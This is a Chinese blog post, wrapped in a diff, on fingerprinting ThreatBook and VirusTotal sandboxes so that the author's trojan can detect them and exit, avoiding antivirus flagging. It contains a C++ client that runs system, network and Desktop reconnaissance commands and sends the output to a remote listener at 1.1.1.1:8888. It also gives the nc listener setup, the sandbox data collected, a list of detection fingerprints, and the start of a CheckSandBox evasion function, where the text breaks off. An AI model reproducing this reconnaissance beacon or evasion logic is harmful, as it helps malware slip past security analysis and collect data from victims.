@@ -1,0 +1,762 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>AV沙箱环境检测和绕过 | Hurn's Blog</title><meta name="description" content="AV沙箱环境检测和绕过 - Hurn"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="Hurn's Blog"><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div class="wrap"><header><h1 class="branding"><a href="/" title="Hurn's Blog"><img class="logo-image" src="/logo.png" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"><a class="nav-list-link" href="https://github.com/Dreyer" target="_blank">GITHUB</a></li><li class="nav-list-item"><a class="nav-list-link" href="/atom.xml" target="_self">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">AV沙箱环境检测和绕过</h1><div class="post-info"><a></a>2022-01-09</div><div class="post-content"><p>最近马一直被传沙箱，导致检测红的项越来越多，甚至开始有IOC情报了，本文主要针对微步和VT网站上的各沙箱进行环境检测和分析，如果判断为沙箱则退出运行，提高免杀能力，解决人与人之间的各种不信任感。</p>
+<h1 id="环境检测准备"><a href="#环境检测准备" class="headerlink" title="环境检测准备"></a>环境检测准备</h1><blockquote>
+<p>需要一个服务端来接受沙箱的数据，一个客户端将相关信息带出沙箱。</p>
+</blockquote>
+<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>服务端接受的socket连接，想写可以自己实现，或者不想写直接用nc代替。</p>
+<blockquote>
+<p>注： 如果收不到数据，就找到台红一点的VPS</p>
+</blockquote>
+<pre><code class="bash">╰─# nc -nlvp 8889
+</code></pre>
+<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><ul>
+<li>编写客户端来获取一些基本信息，主要需要一个执行命令的函数和socket链接，执行命令可能会被报毒，但是没有关系，只是为了方便探测才这么写。</li>
+</ul>
+<pre><code class="c++">// 执行命令
+std::string execCmd(const char* cmd)
+&#123;
+    char buffer[MAX_PATH] = &#123; 0 &#125;;
+    std::string result;
+    FILE* pipe = _popen(cmd, &quot;r&quot;);
+    if (!pipe) throw std::runtime_error(&quot;_popen() failed!&quot;);
+    while (!feof(pipe))
+    &#123;
+        if (fgets(buffer, MAX_PATH, pipe) != NULL)
+            result += buffer;
+    &#125;
+    _pclose(pipe);
+
+    return result;
+&#125;
+
+// SOCKET连接
+int main()&#123;
+    WORD sockVersion = MAKEWORD(2, 2);
+    WSAData saData;
+    if (WSAStartup(sockVersion, &amp;saData)) &#123;
+        return 0;
+    &#125;
+
+    SOCKET sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sclient == INVALID_SOCKET) &#123;
+        printf(&quot;INVALID SOCKET&quot;);
+        return 0;
+    &#125;
+    
+    sockaddr_in serAddr = &#123; 0 &#125;;
+    serAddr.sin_family = AF_INET;
+    serAddr.sin_port = htons(8888);
+    inet_pton(AF_INET, &quot;1.1.1.1&quot;, &amp;serAddr.sin_addr);
+
+    if (connect(sclient, (sockaddr *) &amp;serAddr, sizeof serAddr) == SOCKET_ERROR) &#123;
+        printf(&quot;CONNECT ERROR!&quot;);
+        closesocket(sclient);
+        return 0;
+    &#125;
+
+    // tasklist /svc 
+    string tasklist_result = execCmd(&quot;tasklist /svc&quot;);
+    send(sclient, tasklist_result.c_str(), strlen(tasklist_result.c_str()), 0);
+    send(sclient, &quot;\n&quot;, strlen(&quot;\n&quot;), 0);
+    send(sclient, &quot;\n&quot;, strlen(&quot;\n&quot;), 0);
+    
+    
+    // systeminfo 
+    string systeminfo_result = execCmd(&quot;systeminfo&quot;);
+    send(sclient, systeminfo_result.c_str(), strlen(systeminfo_result.c_str()), 0);
+    send(sclient, &quot;\n&quot;, strlen(&quot;\n&quot;), 0);
+    send(sclient, &quot;\n&quot;, strlen(&quot;\n&quot;), 0);
+
+
+    // arp -a 
+    string arp_result = execCmd(&quot;arp -a&quot;);
+    send(sclient, arp_result.c_str(), strlen(arp_result.c_str()), 0);
+    send(sclient, &quot;\n&quot;, strlen(&quot;\n&quot;), 0);
+    send(sclient, &quot;\n&quot;, strlen(&quot;\n&quot;), 0);
+
+
+    // netstat -ano 
+    string netstat_result = execCmd(&quot;netstat -ano &quot;);
+    send(sclient, netstat_result.c_str(), strlen(netstat_result.c_str()), 0);
+    send(sclient, &quot;\n&quot;, strlen(&quot;\n&quot;), 0);
+    send(sclient, &quot;\n&quot;, strlen(&quot;\n&quot;), 0);
+
+    // ipconfig -a
+    string ipconfig_result = execCmd(&quot;ipconfig /all&quot;);
+    send(sclient, ipconfig_result.c_str(), strlen(ipconfig_result.c_str()), 0);
+    send(sclient, &quot;\n&quot;, strlen(&quot;\n&quot;), 0);
+    send(sclient, &quot;\n&quot;, strlen(&quot;\n&quot;), 0);
+
+    // 桌面文件
+    string desktop_result = execCmd(&quot;dir %USERPROFILE%\\DESKTOP&quot;);
+    send(sclient, desktop_result.c_str(), strlen(desktop_result.c_str()), 0);
+    send(sclient, &quot;\n&quot;, strlen(&quot;\n&quot;), 0);
+    send(sclient, &quot;\n&quot;, strlen(&quot;\n&quot;), 0);
+
+    // net use
+    string NETUSE_result = execCmd(&quot;net use&quot;);
+    send(sclient, NETUSE_result.c_str(), strlen(NETUSE_result.c_str()), 0);
+    send(sclient, &quot;\n&quot;, strlen(&quot;\n&quot;), 0);
+    send(sclient, &quot;\n&quot;, strlen(&quot;\n&quot;), 0);
+
+    closesocket(sclient);
+    WSACleanup();
+    return 0;
+    
+&#125;
+</code></pre>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="微步"><a href="#微步" class="headerlink" title="微步"></a>微步</h2><ul>
+<li><p>微步带回来的数据</p>
+<pre><code class="txt">process id: 0 , process name : [System Process]
+process id: 4 , process name : System
+process id: 244 , process name : smss.exe
+process id: 328 , process name : csrss.exe
+process id: 364 , process name : csrss.exe
+process id: 372 , process name : wininit.exe
+process id: 412 , process name : winlogon.exe
+process id: 460 , process name : services.exe
+process id: 468 , process name : lsass.exe
+process id: 476 , process name : lsm.exe
+process id: 580 , process name : svchost.exe
+process id: 660 , process name : svchost.exe
+process id: 744 , process name : svchost.exe
+process id: 784 , process name : svchost.exe
+process id: 832 , process name : svchost.exe
+process id: 856 , process name : svchost.exe
+process id: 928 , process name : audiodg.exe
+process id: 1092 , process name : svchost.exe
+process id: 1216 , process name : spoolsv.exe
+process id: 1284 , process name : svchost.exe
+process id: 1412 , process name : dwm.exe
+process id: 1440 , process name : explorer.exe
+process id: 1464 , process name : taskhost.exe
+process id: 1528 , process name : AcrylicService.exe
+process id: 1672 , process name : svchost.exe
+process id: 292 , process name : pythonw.exe
+process id: 1592 , process name : SearchIndexer.exe
+process id: 1068 , process name : SearchProtocolHost.exe
+process id: 316 , process name : SearchFilterHost.exe
+process id: 1264 , process name : pythonw.exe
+process id: 1884 , process name : wsqmcons.exe
+process id: 1272 , process name : sdclt.exe
+process id: 1356 , process name : rundll32.exe
+process id: 2088 , process name : taskhost.exe
+process id: 2128 , process name : taskhost.exe
+process id: 2232 , process name : dllhost.exe
+process id: 2320 , process name : WinSAT.exe
+process id: 2328 , process name : conhost.exe
+process id: 2464 , process name : hhasdjalksdjlqwe.exe
+process id: 2524 , process name : conhost.exe
+
+Host Name:                 VBCCSB-PC
+OS Name:                   Microsoft Windows 7 Ultimate 
+OS Version:                6.1.7601 Service Pack 1 Build 7601
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          vbccsb
+Registered Organization:   
+Product ID:                24771-620-3228555-84158
+Original Install Date:     5/23/2018, 2:41:28 AM
+System Boot Time:          10/23/2021, 10:18:41 PM
+System Manufacturer:       System manufacturer
+System Model:              System manufacturer
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x64 Family 6 Model 60 Stepping 1 GenuineIntel ~2394 Mhz
+BIOS Version:              American Megatrends Inc. 1101, 2/4/2013
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             zh-cn;Chinese (China)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+08:00) Beijing, Chongqing, Hong Kong, Urumqi
+Total Physical Memory:     3,071 MB
+Available Physical Memory: 2,585 MB
+Virtual Memory: Max Size:  6,141 MB
+Virtual Memory: Available: 5,646 MB
+Virtual Memory: In Use:    495 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              \\VBCCSB-PC
+Hotfix(s):                 16 Hotfix(s) Installed.
+                           [01]: KB2849697
+                           [02]: KB2849696
+                           [03]: KB2841134
+                           [04]: KB2670838
+                           [05]: KB2819745
+                           [06]: KB2533623
+                           [07]: KB2639308
+                           [08]: KB2729094
+                           [09]: KB2731771
+                           [10]: KB2786081
+                           [11]: KB2834140
+                           [12]: KB2872035
+                           [13]: KB2882822
+                           [14]: KB2888049
+                           [15]: KB2999226
+                           [16]: KB976902
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Realtek RTL8139C+ Fast Ethernet NIC
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 192.168.122.171
+                                 [02]: fe80::7c81:79a:37e:85e5
+
+
+
+Interface: 192.168.122.171 --- 0xb
+  Internet Address      Physical Address      Type
+  192.168.122.1         52-54-00-55-d4-9a     dynamic   
+  192.168.122.255       ff-ff-ff-ff-ff-ff     static    
+  224.0.0.22            01-00-5e-00-00-16     static    
+  224.0.0.252           01-00-5e-00-00-fc     static    
+
+
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       660
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       292
+  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       372
+  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       744
+  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       856
+  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       460
+  TCP    0.0.0.0:49158          0.0.0.0:0              LISTENING       468
+  TCP    192.168.122.171:139    0.0.0.0:0              LISTENING       4
+  TCP    192.168.122.171:8000   192.168.122.1:52332    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52334    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52336    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52342    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52344    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52360    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52362    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52364    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52368    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52418    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52430    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52488    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52564    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52626    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52662    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52672    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52692    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52718    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52732    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52740    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52802    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52816    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52838    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52852    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52862    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52888    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52904    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52918    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52934    TIME_WAIT       0
+  TCP    192.168.122.171:8000   192.168.122.1:52956    TIME_WAIT       0
+  TCP    192.168.122.171:49156  192.168.122.1:4455     FIN_WAIT_2      520
+  TCP    192.168.122.171:49159  192.168.122.1:2052     ESTABLISHED     1264
+  TCP    192.168.122.171:49161  192.168.122.1:2052     ESTABLISHED     1264
+  TCP    192.168.122.171:49162  192.168.122.1:2052     ESTABLISHED     1264
+  TCP    192.168.122.171:49163  1.1.1.1:8888    ESTABLISHED     2464
+  TCP    192.168.122.171:49164  192.168.122.1:2052     ESTABLISHED     1264
+  TCP    192.168.122.171:49165  192.168.122.1:2052     TIME_WAIT       0
+  TCP    192.168.122.171:49166  192.168.122.1:2052     ESTABLISHED     1264
+  TCP    192.168.122.171:49167  192.168.122.1:2052     TIME_WAIT       0
+  TCP    192.168.122.171:49171  192.168.122.1:2052     TIME_WAIT       0
+  TCP    192.168.122.171:49172  192.168.122.1:2052     TIME_WAIT       0
+  TCP    192.168.122.171:49173  192.168.122.1:2052     ESTABLISHED     1264
+  TCP    192.168.122.171:49174  192.168.122.1:2052     ESTABLISHED     1264
+  TCP    192.168.122.171:49175  192.168.122.1:2052     TIME_WAIT       0
+  TCP    192.168.122.171:49177  192.168.122.1:2052     TIME_WAIT       0
+  TCP    192.168.122.171:49178  192.168.122.1:2052     ESTABLISHED     1264
+  TCP    192.168.122.171:49179  192.168.122.1:2052     ESTABLISHED     1264
+  TCP    [::]:135               [::]:0                 LISTENING       660
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:49152             [::]:0                 LISTENING       372
+  TCP    [::]:49153             [::]:0                 LISTENING       744
+  TCP    [::]:49154             [::]:0                 LISTENING       856
+  TCP    [::]:49155             [::]:0                 LISTENING       460
+  TCP    [::]:49158             [::]:0                 LISTENING       468
+  UDP    0.0.0.0:53             *:*                                    1528
+  UDP    0.0.0.0:500            *:*                                    856
+  UDP    0.0.0.0:4500           *:*                                    856
+  UDP    0.0.0.0:5355           *:*                                    1092
+  UDP    192.168.122.171:137    *:*                                    4
+  UDP    192.168.122.171:138    *:*                                    4
+  UDP    [::]:53                *:*                                    1528
+  UDP    [::]:500               *:*                                    856
+  UDP    [::]:4500              *:*                                    856
+  UDP    [::]:5355              *:*                                    1092
+  UDP    [fe80::7c81:79a:37e:85e5%11]:546  *:*                                    744
+
+
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : vbccsb-PC
+   Primary Dns Suffix  . . . . . . . : 
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : Realtek RTL8139C+ Fast Ethernet NIC
+   Physical Address. . . . . . . . . : 52-54-00-3E-44-49
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   Link-local IPv6 Address . . . . . : fe80::7c81:79a:37e:85e5%11(Preferred) 
+   IPv4 Address. . . . . . . . . . . : 192.168.122.171(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.122.1
+   DHCPv6 IAID . . . . . . . . . . . : 240276480
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-22-96-1C-65-52-54-00-9E-8D-9D
+   DNS Servers . . . . . . . . . . . : 127.0.0.1
+                                       8.8.8.8
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+Tunnel adapter isatap.&#123;1141D443-46F3-4C40-8D6C-D57632F2B3B2&#125;:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
+   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+</code></pre>
+</li>
+<li><p>微步分析，传了多次样本之后发现有些特别东西</p>
+<ul>
+<li><p>进程，有几个用来分析的进程</p>
+<pre><code class="c++">process id: 1528 , process name : AcrylicService.exe        // DNS代理程序，用来检测DNS流量
+</code></pre>
+</li>
+<li><p>壁纸 ， 微步沙箱的壁纸每次是不变的</p>
+<pre><code class="c++">C:\Users\vbccsb\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper.jpg        //路径
+1645643018        //壁纸文件的hash
+</code></pre>
+</li>
+<li><p>用户名 ， 每次运行沙箱的用户名不变 ，都是vbccsb</p>
+<pre><code class="txt">主机名:VBCCSB-PC
+用户名:vbccsb_*
+进程:519e67c447b16520ceaa2b84a8d8fb2da94b8edab
+内网IP:192.168.122.192
+出口IP:106.75.3.131
+
+主机名:VBCCSB-PC
+用户名:vbccsb_*
+进程:123.exe
+内网IP:192.168.122.192
+出口IP:106.75.35.22
+</code></pre>
+</li>
+<li><p>系统制作厂商和型号 ， 正常PC的系统制作厂商都是电脑的牌子 DELL、LENEVO、ASUS</p>
+<pre><code class="txt">// 微步
+System Manufacturer:       System manufacturer
+System Model:              System manufacturer
+
+
+// 正常的制作厂商和型号，三星、ASUS 
+System Manufacturer:       SAMSUNG
+System Model:              670Z5E
+
+System Manufacturer:       ASUS
+System Model:              P5E-VM DO
+</code></pre>
+</li>
+<li><p>性能指标，例如 内存大小、CPU核数等，现在很少见内存少于4G的PC</p>
+<pre><code class="txt">Total Physical Memory:     3,071 MB
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="VT沙箱"><a href="#VT沙箱" class="headerlink" title="VT沙箱"></a>VT沙箱</h2><ul>
+<li><p>VT 沙箱 回传的数据 ，实际上把样本传到VT上去之后，VT上面的各个引擎会独立运行一遍，会一直回传数据，所以建议服务端自己实现一下，不然会漏掉一些沙箱数据，下面是个别例子。</p>
+<pre><code class="txt">D:\TRANSFER\acb63d33-1034-ec11-b6ee-002248784cbe\zxczxczqwe12312.exe
+process id: 0 , process name : [System Process]
+process id: 4 , process name : System
+process id: 252 , process name : smss.exe
+process id: 340 , process name : csrss.exe
+process id: 416 , process name : csrss.exe
+process id: 432 , process name : wininit.exe
+process id: 472 , process name : winlogon.exe
+process id: 540 , process name : services.exe
+process id: 548 , process name : lsass.exe
+process id: 616 , process name : svchost.exe
+process id: 636 , process name : fontdrvhost.exe
+process id: 644 , process name : fontdrvhost.exe
+process id: 712 , process name : svchost.exe
+process id: 816 , process name : dwm.exe
+process id: 928 , process name : svchost.exe
+process id: 936 , process name : svchost.exe
+process id: 972 , process name : svchost.exe
+process id: 988 , process name : svchost.exe
+process id: 364 , process name : svchost.exe
+process id: 1044 , process name : svchost.exe
+process id: 1072 , process name : svchost.exe
+process id: 1180 , process name : VSSVC.exe
+process id: 1480 , process name : svchost.exe
+process id: 1540 , process name : svchost.exe
+process id: 1548 , process name : svchost.exe
+process id: 1856 , process name : SecurityHealthService.exe
+process id: 1864 , process name : svchost.exe
+process id: 1872 , process name : VmRemoteGuest.exe
+process id: 1568 , process name : sihost.exe
+process id: 1832 , process name : taskhostw.exe
+process id: 2196 , process name : explorer.exe
+process id: 2264 , process name : svchost.exe
+process id: 2552 , process name : ShellExperienceHost.exe
+process id: 2588 , process name : SearchUI.exe
+process id: 2724 , process name : RuntimeBroker.exe
+process id: 2760 , process name : WmiPrvSE.exe
+process id: 2976 , process name : backgroundTaskHost.exe
+process id: 2356 , process name : backgroundTaskHost.exe
+process id: 2432 , process name : RemindersServer.exe
+process id: 3584 , process name : msiexec.exe
+process id: 3660 , process name : svchost.exe
+process id: 2896 , process name : GoogleUpdateSetup.exe
+process id: 2488 , process name : GoogleUpdate.exe
+process id: 3180 , process name : cmd.exe
+process id: 1364 , process name : conhost.exe
+process id: 1436 , process name : Detonate.exe
+process id: 4016 , process name : Sysmon64.exe
+process id: 2628 , process name : BackgroundTransferHost.exe
+process id: 4000 , process name : unsecapp.exe
+process id: 3360 , process name : Sysmon64.exe
+process id: 2460 , process name : WmiPrvSE.exe
+process id: 3572 , process name : zxczxczqwe12312.exe
+process id: 3108 , process name : conhost.exe
+
+Host Name:                 WIN-5E07COS9ALR
+OS Name:                   Microsoft Windows 10 Enterprise
+OS Version:                10.0.15063 N/A Build 15063
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          N/A
+Registered Organization:   N/A
+Product ID:                00329-00000-00003-AA343
+Original Install Date:     4/11/2017, 1:58:46 PM
+System Boot Time:          10/23/2021, 12:02:42 AM
+System Manufacturer:       Microsoft Corporation
+System Model:              Virtual Machine
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2295 Mhz
+BIOS Version:              American Megatrends Inc. 090007 , 5/18/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)
+Total Physical Memory:     1,024 MB
+Available Physical Memory: 323 MB
+Virtual Memory: Max Size:  2,752 MB
+Virtual Memory: Available: 2,138 MB
+Virtual Memory: In Use:    614 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              \\WIN-5E07COS9ALR
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Microsoft Hyper-V Network Adapter
+                                 Connection Name: Ethernet 4
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 192.168.0.11
+                                 [02]: fe80::89e3:b1dc:c950:614a
+Hyper-V Requirements:      VM Monitor Mode Extensions: No
+                           Virtualization Enabled In Firmware: No
+                           Second Level Address Translation: No
+                           Data Execution Prevention Available: Yes
+
+
+
+Interface: 192.168.0.11 --- 0x6
+  Internet Address      Physical Address      Type
+  192.168.0.1           00-15-5d-00-10-00     dynamic   
+  192.168.255.255       ff-ff-ff-ff-ff-ff     static    
+
+
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       712
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       936
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       432
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       988
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       928
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       540
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       548
+  TCP    192.168.0.11:139       0.0.0.0:0              LISTENING       4
+  TCP    192.168.0.11:49684     23.223.55.43:80        ESTABLISHED     4016
+  TCP    192.168.0.11:49685     13.107.4.50:80         ESTABLISHED     4016
+  TCP    192.168.0.11:49686     23.49.139.27:80        ESTABLISHED     4016
+  TCP    192.168.0.11:49687     72.21.91.29:80         ESTABLISHED     4016
+  TCP    192.168.0.11:49688     23.49.139.27:80        ESTABLISHED     4016
+  TCP    192.168.0.11:49689     72.21.91.29:80         ESTABLISHED     4016
+  TCP    192.168.0.11:49691     104.98.114.26:443      ESTABLISHED     2628
+  TCP    192.168.0.11:49692     104.98.114.26:443      ESTABLISHED     2628
+  TCP    192.168.0.11:49693     72.21.91.29:80         ESTABLISHED     2628
+  TCP    192.168.0.11:49694     23.49.139.27:80        ESTABLISHED     4016
+  TCP    192.168.0.11:49695     72.21.91.29:80         ESTABLISHED     4016
+  TCP    192.168.0.11:49696     23.49.139.27:80        ESTABLISHED     4016
+  TCP    [::]:135               [::]:0                 LISTENING       712
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:3389              [::]:0                 LISTENING       936
+  TCP    [::]:49664             [::]:0                 LISTENING       432
+  TCP    [::]:49665             [::]:0                 LISTENING       988
+  TCP    [::]:49666             [::]:0                 LISTENING       928
+  TCP    [::]:49667             [::]:0                 LISTENING       540
+  TCP    [::]:49668             [::]:0                 LISTENING       548
+  UDP    0.0.0.0:3389           *:*                                    936
+  UDP    192.168.0.11:137       *:*                                    4
+  UDP    192.168.0.11:138       *:*                                    4
+  UDP    [::]:3389              *:*                                    936
+  UDP    [fe80::89e3:b1dc:c950:614a%6]:546  *:*                                    988
+
+
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : WIN-5E07COS9ALR
+   Primary Dns Suffix  . . . . . . . : 
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+
+Ethernet adapter Ethernet 4:
+
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : Microsoft Hyper-V Network Adapter #4
+   Physical Address. . . . . . . . . : 00-15-5D-00-08-2A
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   Link-local IPv6 Address . . . . . : fe80::89e3:b1dc:c950:614a%6(Preferred) 
+   IPv4 Address. . . . . . . . . . . : 192.168.0.11(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 192.168.0.1
+   DHCPv6 IAID . . . . . . . . . . . : 100668765
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-23-4E-C8-63-00-15-5D-1A-91-10
+   DNS Servers . . . . . . . . . . . : 168.63.129.16
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+</code></pre>
+</li>
+<li><p>VT沙箱分析，VT上大多是些国外的沙箱，所以跟微步还有点不同。</p>
+<ul>
+<li><p>文件名，部分沙箱会将样本 Hash 重命名或者下载的样本都是以 HASH命名的文件，也可以通过这个特征检测</p>
+<pre><code class="txt">676ef88e8c8772b4751605835cb3a8a5.exe
+</code></pre>
+<p>进程，部分沙箱也会开以下进程</p>
+<pre><code class="txt">AcrylicService.exe
+</code></pre>
+</li>
+<li><p>性能 ，大多数沙箱的内存都小于4G </p>
+<pre><code class="txt">4.txt:Available Physical Memory: 560 MB
+5.txt:Available Physical Memory: 1,499 MB
+6.txt:Available Physical Memory: 915 MB
+7.txt:Available Physical Memory: 1,003 MB
+8.txt:Available Physical Memory: 5,228 MB
+9.txt:Available Physical Memory: 5,215 MB
+</code></pre>
+</li>
+<li><p>语言 ， 国外沙箱的语言大多为英文</p>
+<pre><code class="bash">╰─# grep &#39;System Locale&#39; *.txt                                                                                             
+4.txt:System Locale:             en-us;English (United States)
+5.txt:System Locale:             en-us;English (United States)
+6.txt:System Locale:             en-us;English (United States)
+7.txt:System Locale:             en-us;English (United States)
+8.txt:System Locale:             en-us;English (United States)
+9.txt:System Locale:             en-us;English (United States)
+</code></pre>
+</li>
+<li><p>时区 ，VT上的沙箱大多为国外时区，国内的时区为东八区</p>
+<pre><code class="txt">╰─# grep &#39;Time Zone&#39; *.txt    
+4.txt:Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)
+5.txt:Time Zone:                 (UTC+01:00) Amsterdam, Berlin, Bern, Rome, Stockholm, Vienna
+6.txt:Time Zone:                 (UTC-05:00) Eastern Time (US &amp; Canada)
+7.txt:Time Zone:                 (UTC+02:00) Athens, Bucharest
+8.txt:Time Zone:                 (UTC) Co-ordinated Universal Time
+9.txt:Time Zone:                 (UTC) Co-ordinated Universal Time
+</code></pre>
+</li>
+<li><p>系统制作厂商和型号，部分沙箱的制作厂商为QEMU</p>
+<pre><code class="txt">╰─# grep &#39;System Manufacturer&#39; *.txt
+4.txt:System Manufacturer:       DELL
+5.txt:System Manufacturer:       Dell Inc.
+6.txt:System Manufacturer:       ASUS
+7.txt:System Manufacturer:       SAMSUNG
+8.txt:System Manufacturer:       QEMU
+9.txt:System Manufacturer:       QEMU
+
+╰─# grep &#39;System Model&#39; *.txt       
+4.txt:System Model:              Standard PC (i440FX + PIIX, 1996)
+5.txt:System Model:              OptiPlex 7010
+6.txt:System Model:              P5E-VM DO
+7.txt:System Model:              670Z5E
+8.txt:System Model:              Standard PC (i440FX + PIIX, 1996)
+9.txt:System Model:              Standard PC (i440FX + PIIX, 1996)
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><ul>
+<li><p>可以根据上述特征进行分析环境，判断是沙箱则执行别的逻辑。另外沙箱的特征和检测方式很多，下列的检测方式可能合适也可能不合适，需要根据使用场景进行选择。</p>
+<pre><code class="c++">VOID BypassAV::CheckSandBox(BOOL *Flag) &#123;
+    // 定义异常
+    runtime_error err(&quot;55551~~~~~~~~~~~~~~&quot;);
+
+    // 检测微步 ，壁纸hash 或 用户名
